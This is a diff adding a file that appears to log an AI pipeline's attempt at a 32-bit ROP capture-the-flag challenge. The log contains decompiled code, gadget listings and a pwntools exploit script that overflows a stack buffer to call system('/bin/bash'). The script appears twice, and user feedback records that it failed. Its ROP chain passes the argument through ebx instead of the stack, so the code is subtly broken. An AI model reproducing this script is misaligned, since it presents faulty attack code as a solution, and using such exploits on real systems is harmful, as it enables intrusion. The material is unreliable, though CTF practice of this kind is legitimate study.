@@ -1,0 +1,161 @@
+{'documents': [],
+ 'error': 'yes',
+ 'generation': code(prefix='To solve this challenge, we need to exploit the buffer overflow in the `vulnerable_function` and use Return-Oriented Programming (ROP) to bypass the NX protection. Since there is no stack canary, we can overwrite the return address of the `vulnerable_function` with the address of a ROP gadget that will eventually lead to calling the `system` function with the argument "/bin/bash". Here\'s how you can do it using pwntools.', imports="from pwn import *\n\ncontext.binary = './pwn/stack/rop-2/rop2'\ncontext.terminal = ['tmux', 'splitw', '-h']\ncontext.log_level = 'debug'\n", code='def exploit():\n    # Start the process\n    p = process()\n\n    # Find the offset to the return address\n    offset = 136 + 4  # 136 bytes for the buffer + 4 bytes for saved EBP\n\n    # Find the address of system and "/bin/bash"\n    system_addr = p.elf.symbols[\'system\']\n    bin_sh_addr = next(p.elf.search(b\'/bin/bash\'))\n\n    # Find the ROP gadgets\n    pop_ebx = 0x08048364  # pop ebx; ret\n    ret = 0x08048343  # ret\n\n    # Build the ROP chain\n    rop_chain = b\'\'\n    rop_chain += p32(pop_ebx)\n    rop_chain += p32(bin_sh_addr)\n    rop_chain += p32(ret)  # Align the stack\n    rop_chain += p32(system_addr)\n\n    # Create the payload\n    payload = b\'A\' * offset\n    payload += rop_chain\n\n    # Send the payload\n    p.sendline(payload)\n\n    # Pass interaction to the user\n    p.interactive()\n\nif __name__ == \'__main__\':\n    exploit()'),
+ 'info': 'Challenge is a ELF 32-bit LSB executable file and the file path is '
+         '"./pwn/stack/rop-2/rop2".\n'
+         '1.Here is the key function for exploit in the C file decompiled from '
+         'rop2:\n'
+         '----- (080484B8) '
+         '--------------------------------------------------------\n'
+         'ssize_t vulnerable_function()\n'
+         '{\n'
+         '  char buf[136]; // [esp+10h] [ebp-88h] BYREF\n'
+         '\n'
+         '  return read(0, buf, 0x100u);\n'
+         '}\n'
+         '// 80484B8: using guessed type int vulnerable_function(void);\n'
+         '\n'
+         '\n'
+         '//----- (0804850A) '
+         '--------------------------------------------------------\n'
+         'int __cdecl main(int argc, const char **argv, const char **envp)\n'
+         '{\n'
+         '  be_nice_to_people();\n'
+         '  vulnerable_function();\n'
+         '  return write(1, "Hello, World\\n", 0xDu);\n'
+         '}\n'
+         '// 80484B8: using guessed type int vulnerable_function(void);\n'
+         '// 80484E1: using guessed type int be_nice_to_people(void);\n'
+         '\n'
+         "2.Here is the file security infomation identified by 'checksec' "
+         'command:\n'
+         '{"relro": "partial", "canary": "no", "nx": "yes", "pie": "no", '
+         '"rpath": "no", "runpath": "no", "symbols": "yes", "fortify_source": '
+         '"no", "fortified": "0", "fortify-able": "1"}\n'
+         '\n'
+         '3.Here is some printable strings in the data sections of rop2:\n'
+         '/bin/bash\n'
+         '/bin/date\n'
+         '\n'
+         '4.We use ROPgadget to search gadgets on rop2:\n'
+         'Gadgets information\n'
+         '============================================================\n'
+         '0x08048473 : pop ebp ; ret\n'
+         '0x08048472 : pop ebx ; pop ebp ; ret\n'
+         '0x0804859c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n'
+         '0x08048364 : pop ebx ; ret\n'
+         '0x0804859e : pop edi ; pop ebp ; ret\n'
+         '0x0804859d : pop esi ; pop edi ; pop ebp ; ret\n'
+         '0x08048343 : ret\n'
+         '0x0804819c : ret 0xbe16\n'
+         '\n'
+         'Unique gadgets found: 8\n'
+         '\n'
+         "5.Here is information of the file's relocation section:\n"
+         "Relocation section '.rel.plt' at offset 0x300 contains 7 entries:\n"
+         ' Offset     Info    Type            Sym.Value  Sym. Name\n'
+         '0804a000  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0\n'
+         '0804a004  00000207 R_386_JUMP_SLOT   00000000   getegid@GLIBC_2.0\n'
+         '0804a008  00000307 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0\n'
+         '0804a00c  00000407 R_386_JUMP_SLOT   00000000   __gmon_start__\n'
+         '0804a010  00000507 R_386_JUMP_SLOT   00000000   '
+         '__libc_start_main@GLIBC_2.0\n'
+         '0804a014  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0\n'
+         '0804a018  00000707 R_386_JUMP_SLOT   00000000   setresgid@GLIBC_2.0\n'
+         '\n',
+ 'iterations': 1,
+ 'messages': [('user', 'How do I use pwntool to solve this challange?'),
+              ('assistant',
+               'To solve this challenge, we need to exploit the buffer '
+               'overflow in the `vulnerable_function` and use Return-Oriented '
+               'Programming (ROP) to bypass the NX protection. Since there is '
+               'no stack canary, we can overwrite the return address of the '
+               '`vulnerable_function` with the address of a ROP gadget that '
+               'will eventually lead to calling the `system` function with the '
+               'argument "/bin/bash". Here\'s how you can do it using '
+               'pwntools. \n'
+               ' Imports: from pwn import *\n'
+               '\n'
+               "context.binary = './pwn/stack/rop-2/rop2'\n"
+               "context.terminal = ['tmux', 'splitw', '-h']\n"
+               "context.log_level = 'debug'\n"
+               ' \n'
+               ' Code: def exploit():\n'
+               '    # Start the process\n'
+               '    p = process()\n'
+               '\n'
+               '    # Find the offset to the return address\n'
+               '    offset = 136 + 4  # 136 bytes for the buffer + 4 bytes for '
+               'saved EBP\n'
+               '\n'
+               '    # Find the address of system and "/bin/bash"\n'
+               "    system_addr = p.elf.symbols['system']\n"
+               "    bin_sh_addr = next(p.elf.search(b'/bin/bash'))\n"
+               '\n'
+               '    # Find the ROP gadgets\n'
+               '    pop_ebx = 0x08048364  # pop ebx; ret\n'
+               '    ret = 0x08048343  # ret\n'
+               '\n'
+               '    # Build the ROP chain\n'
+               "    rop_chain = b''\n"
+               '    rop_chain += p32(pop_ebx)\n'
+               '    rop_chain += p32(bin_sh_addr)\n'
+               '    rop_chain += p32(ret)  # Align the stack\n'
+               '    rop_chain += p32(system_addr)\n'
+               '\n'
+               '    # Create the payload\n'
+               "    payload = b'A' * offset\n"
+               '    payload += rop_chain\n'
+               '\n'
+               '    # Send the payload\n'
+               '    p.sendline(payload)\n'
+               '\n'
+               '    # Pass interaction to the user\n'
+               '    p.interactive()\n'
+               '\n'
+               "if __name__ == '__main__':\n"
+               '    exploit()'),
+              ('user',
+               'Your solution failed the code execution test: The code '
+               'execution is complete, but the exploit fails, and go into fake '
+               'interactive mode')]}
+from pwn import *
+
+context.binary = './pwn/stack/rop-2/rop2'
+context.terminal = ['tmux', 'splitw', '-h']
+context.log_level = 'debug'
+
+def exploit():
+    # Start the process
+    p = process()
+
+    # Find the offset to the return address
+    offset = 136 + 4  # 136 bytes for the buffer + 4 bytes for saved EBP
+
+    # Find the address of system and "/bin/bash"
+    system_addr = p.elf.symbols['system']
+    bin_sh_addr = next(p.elf.search(b'/bin/bash'))
+
+    # Find the ROP gadgets
+    pop_ebx = 0x08048364  # pop ebx; ret
+    ret = 0x08048343  # ret
+
+    # Build the ROP chain
+    rop_chain = b''
+    rop_chain += p32(pop_ebx)
+    rop_chain += p32(bin_sh_addr)
+    rop_chain += p32(ret)  # Align the stack
+    rop_chain += p32(system_addr)
+
+    # Create the payload
+    payload = b'A' * offset
+    payload += rop_chain
+
+    # Send the payload
+    p.sendline(payload)
+
+    # Pass interaction to the user
+    p.interactive()
+
+if __name__ == '__main__':
+    exploit()
